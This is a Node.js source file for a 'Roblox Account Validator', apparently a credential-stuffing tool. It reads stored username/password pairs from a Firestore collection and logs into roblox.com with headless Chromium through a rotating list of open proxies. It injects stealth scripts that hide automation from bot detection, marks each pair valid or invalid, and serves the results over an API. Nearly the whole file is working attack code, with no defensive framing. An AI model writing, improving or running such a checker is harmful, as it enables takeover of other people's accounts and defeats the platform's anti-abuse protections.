// ============================================================
//  Roblox Account Validator — ULTIMATE 2026 STEALTH EDITION
//  (100+ New Proxies + Advanced Bot Bypass + Exact Logic)
// ============================================================

const express = require("express");
const cors = require("cors");
const path = require("path");
const admin = require("firebase-admin");
const { chromium } = require("playwright");
const fs = require("fs");

// ── Firebase Setup ───────────────────────────────────────────
let serviceAccount;
try {
  if (process.env.FIREBASE_CONFIG) {
    serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
  } else {
    serviceAccount = require("./oren-devs-firebase-adminsdk.json");
  }
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
  });
} catch (err) {
  console.error("Firebase Init Failed:", err.message);
  process.exit(1);
}

const db = admin.firestore();

// ── Express App ──────────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Ensure screenshots directory exists
const SCREENSHOT_DIR = path.join(__dirname, "debug_screenshots");
if (!fs.existsSync(SCREENSHOT_DIR)) {
  fs.mkdirSync(SCREENSHOT_DIR);
}

// ── Stats Tracking ───────────────────────────────────────────
let stats = {
  processed: 0,
  valid: 0,
  invalid: 0,
  queue: 0,
  processing: 0,
};

// ── NEW PROXY LIST (Extracted from user's list) ───────────────
const PROXY_LIST = [
  "http://199.212.90.147:80", "http://185.162.231.99:80", "http://141.193.213.58:80",
  "http://23.227.39.106:80", "http://45.12.31.3:80", "http://45.131.5.92:80",
  "http://185.162.230.139:80", "http://66.235.200.87:80", "http://141.101.121.138:80",
  "http://172.67.188.19:80", "http://31.43.179.155:80", "http://172.67.146.243:80",
  "http://159.112.235.73:80", "http://45.131.7.210:80", "http://185.162.229.115:80",
  "http://45.131.7.113:80", "http://159.112.235.26:80", "http://172.67.180.22:80",
  "http://172.64.156.213:80", "http://172.67.91.190:80", "http://185.162.228.125:80",
  "http://172.67.185.174:80", "http://108.162.194.156:80", "http://160.153.0.35:80",
  "http://141.101.120.85:80", "http://172.67.180.39:80", "http://185.162.229.182:80",
  "http://45.131.7.146:80", "http://172.67.70.147:80", "http://172.64.149.81:80",
  "http://23.227.39.29:80", "http://190.93.247.3:80", "http://134.209.29.120:80",
  "http://45.12.31.63:80", "http://185.162.229.116:80", "http://172.67.70.66:80",
  "http://185.162.229.210:80", "http://172.67.162.127:80", "http://172.66.40.203:80",
  "http://63.141.128.97:80", "http://45.131.208.21:80", "http://185.162.228.165:80",
  "http://141.193.213.155:80", "http://172.67.181.89:80", "http://185.162.228.85:80",
  "http://188.114.96.33:80", "http://102.177.176.154:80", "http://159.112.235.179:80",
  "http://45.131.7.22:80", "http://141.101.120.21:80", "http://69.84.182.10:80",
  "http://45.12.31.106:80", "http://45.12.30.88:80", "http://172.67.70.5:80",
  "http://141.193.213.217:80", "http://172.67.172.154:80", "http://159.112.235.101:80",
  "http://45.76.54.40:80", "http://45.12.31.105:80", "http://185.162.230.65:80",
  "http://23.227.38.207:80", "http://172.67.229.21:80", "http://141.101.120.2:80",
  "http://185.162.230.164:80", "http://172.67.180.46:80", "http://141.101.114.87:80",
  "http://185.162.230.245:80", "http://45.12.31.193:80", "http://69.84.182.17:80",
  "http://141.101.121.167:80", "http://45.131.4.206:80", "http://66.235.200.101:80",
  "http://141.193.213.177:80", "http://185.162.228.14:80", "http://172.67.176.160:80",
  "http://159.112.235.235:80", "http://185.162.231.105:80", "http://172.67.167.36:80",
  "http://185.162.230.169:80", "http://172.64.149.2:80", "http://23.227.38.210:80",
  "http://172.64.84.211:80", "http://172.67.176.106:80", "http://172.64.69.38:80",
  "http://172.67.167.25:80", "http://45.131.4.91:80", "http://141.193.213.56:80",
  "http://141.101.121.237:80", "http://31.43.179.185:80", "http://31.43.179.32:80",
  "http://173.245.49.50:80", "http://185.162.228.203:80"
];

// ── EXACT SELECTORS ──────────────────────────────────────────
const SELECTORS = {
  username: "#login-username",
  password: "#login-password",
  submit: "#login-button",
  error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"], #GeneralErrorText",
  settings: "span#nav-settings",
  logout: "a.rbx-menu-item.logout-menu-item",
  captcha: "#captcha-container, iframe[src*='arkoselabs']"
};

// ── Helper Utilities ─────────────────────────────────────────
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ── Advanced Stealth Configuration (2026 Edition) ────────────
async function applyUltimateStealth(page) {
  // 1. Navigator.webdriver override
  await page.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  });

  // 2. Mock Chrome Runtime & Plugins
  await page.addInitScript(() => {
    window.chrome = {
      runtime: { id: undefined, connect: () => {}, sendMessage: () => {} },
      app: { isInstalled: false },
      csi: () => ({ startE: Date.now(), onloadT: Date.now(), pageT: 3000, tran: 15 }),
      loadTimes: () => ({ requestTime: Date.now() / 1000, startLoadTime: Date.now() / 1000 })
    };
    const plugins = [{ name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer' }];
    Object.defineProperty(navigator, 'plugins', { get: () => plugins });
  });

  // 3. WebGL Fingerprint Patch
  await page.addInitScript(() => {
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {
      if (parameter === 37445) return 'Intel Inc.';
      if (parameter === 37446) return 'Intel Iris OpenGL Engine';
      return getParameter.call(this, parameter);
    };
  });
}

// ── VALIDATE CREDENTIAL PROCESS ──────────────────────────────
async function validateCredential(doc) {
  const { id } = doc;
  const { username, password } = doc.data();
  let browser = null;

  try {
    stats.processing = 1;
    const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
    console.log(`[${username}] Starting validation using proxy: ${proxy}`);

    // Launch invisible headless Chrome
    browser = await chromium.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-blink-features=AutomationControlled",
        "--disable-features=IsolateOrigins,site-per-process",
        `--proxy-server=${proxy}`,
      ],
    });

    const context = await browser.newContext({
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      viewport: { width: 1280, height: 720 },
      ignoreHTTPSErrors: true
    });

    const page = await context.newPage();
    page.setDefaultTimeout(180000); // 3 minutes for slow proxies
    page.setDefaultNavigationTimeout(180000);

    await applyUltimateStealth(page);

    // Navigate to Roblox login
    console.log(`[${username}] Navigating to https://roblox.com/login...`);
    
    // Try navigation with multiple strategies to avoid timeouts
    try {
      await page.goto("https://www.roblox.com/login", { waitUntil: "domcontentloaded", timeout: 120000 });
    } catch (e) {
      console.warn(`[${username}] Navigation timeout, retrying with 'load'...`);
      await page.goto("https://www.roblox.com/login", { waitUntil: "load", timeout: 120000 });
    }

    // Wait for username field
    await page.waitForSelector(SELECTORS.username, { timeout: 60000 });
    
    // Type credentials with slight human delay
    await page.type(SELECTORS.username, username, { delay: 60 });
    await page.type(SELECTORS.password, password, { delay: 60 });

    // Click exact login button
    console.log(`[${username}] Clicking login button...`);
    await page.click(SELECTORS.submit);

    // Wait for page to fully load with no network activity
    console.log(`[${username}] Waiting for network idle...`);
    try {
      await page.waitForLoadState("networkidle", { timeout: 45000 });
    } catch (e) {
      console.warn(`[${username}] Network idle timed out, checking elements anyway.`);
    }

    await sleep(3000);

    // Check for success or failure
    const hasCaptcha = await page.$(SELECTORS.captcha);
    const hasError = await page.$(SELECTORS.error);
    const hasSettings = await page.$(SELECTORS.settings);

    if (hasCaptcha) {
      throw new Error("CAPTCHA Detected - Requires Manual Intervention or Residential Proxy");
    }

    if (hasError || !hasSettings) {
      console.log(`[${username}] Result: INVALID`);
      let errorText = "Login failed / Settings icon not found";
      if (hasError) {
        errorText = await page.evaluate(el => el.innerText, hasError);
      }

      await db.collection("credentials").doc(id).update({
        status: "invalid",
        error: errorText.trim(),
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });
      stats.invalid++;
    } else {
      console.log(`[${username}] Result: VALID`);
      
      // Perform Logout Flow
      await page.click(SELECTORS.settings);
      await page.waitForSelector(SELECTORS.logout, { timeout: 10000 });
      await page.click(SELECTORS.logout);
      
      // Wait for page to reload
      try { await page.waitForLoadState("load", { timeout: 15000 }); } catch (e) {}

      await db.collection("credentials").doc(id).update({
        status: "valid",
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });
      stats.valid++;
    }

    stats.processed++;
  } catch (err) {
    console.error(`[${username}] Error: ${err.message}`);
    await db.collection("credentials").doc(id).update({
      status: "invalid",
      error: `Critical: ${err.message}`,
      processed_at: admin.firestore.FieldValue.serverTimestamp(),
    });
    stats.invalid++;
    stats.processed++;
  } finally {
    stats.processing = 0;
    if (browser) await browser.close();
  }
}

// ── MAIN VALIDATOR LOOP ──────────────────────────────────────
async function mainValidatorLoop() {
  console.log(`[${new Date().toISOString()}] --- Validator Loop Tick ---`);
  
  try {
    const pendingSnapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .get();
    
    stats.queue = pendingSnapshot.size;

    const snapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .orderBy("added_at", "asc")
      .limit(1)
      .get();

    if (snapshot.empty) {
      console.log("No pending documents. Waiting 10s...");
    } else {
      const doc = snapshot.docs[0];
      await db.collection("credentials").doc(doc.id).update({ status: "processing" });
      await validateCredential(doc);
    }
  } catch (err) {
    console.error("Loop Error:", err.message);
  }

  setTimeout(mainValidatorLoop, 10000);
}

// ── REST API ─────────────────────────────────────────────────
app.get("/api/stats", (req, res) => {
  res.json({ ...stats, uptime: Math.floor(process.uptime()) + "s", server_time: new Date().toISOString() });
});

app.get("/api/pending_list", async (req, res) => {
  try {
    const snapshot = await db.collection("credentials").where("status", "==", "pending").orderBy("added_at", "asc").limit(20).get();
    res.json(snapshot.docs.map(doc => ({ id: doc.id, username: doc.data().username })));
  } catch (err) { res.json([]); }
});

app.get("/api/recent", async (req, res) => {
  try {
    const snapshot = await db.collection("credentials").where("status", "in", ["valid", "invalid"]).orderBy("processed_at", "desc").limit(10).get();
    res.json(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data(), processed_at: doc.data().processed_at ? { _seconds: doc.data().processed_at.seconds } : null })));
  } catch (err) { res.json([]); }
});

app.get("/health", (req, res) => res.json({ status: "ok" }));
app.get("/dashboard", (req, res) => res.sendFile(path.join(__dirname, "public", "dashboard.html")));
app.get("*", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

app.listen(PORT, () => {
  console.log(`🚀 RobloxC Validator Live on Port ${PORT}`);
  mainValidatorLoop();
});
